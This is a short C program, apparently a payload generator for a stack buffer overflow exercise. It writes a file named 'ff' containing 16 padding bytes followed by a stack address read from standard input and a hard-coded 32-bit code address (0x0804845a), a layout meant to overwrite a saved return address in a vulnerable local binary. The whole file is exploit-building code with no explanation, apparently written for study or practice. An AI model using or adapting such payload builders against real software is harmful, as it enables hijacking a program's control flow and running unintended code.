#include <stdio.h>

int main(void)
{
	FILE *fp;
	int i;
	int ret;
	unsigned long *datap;
	char input_buf[128];
	unsigned long long data;

	char buf[] = {
		0x30,0x30,0x30,0x30,
		0x30,0x30,0x30,0x30,
		0x30,0x30,0x30,0x30,
		0x30,0x30,0x30,0x30,
		//0xb8, 0x2c, 0x9b, 0xbf,
		0x68, 0xed, 0xa0, 0xbf,
		0x5a, 0x84, 0x04, 0x08,
	};
	/* 804845a */
	fp = fopen("ff", "w");

	datap = (void *)(buf + 16);
	fgets(input_buf, 128, stdin);
	data = atoll(input_buf);
	*datap = data;
	printf("get buf(%s), 0x%x\n", input_buf, *datap);

	fwrite(buf, 1, 24, fp);
	fclose(fp);

	return 0;
}
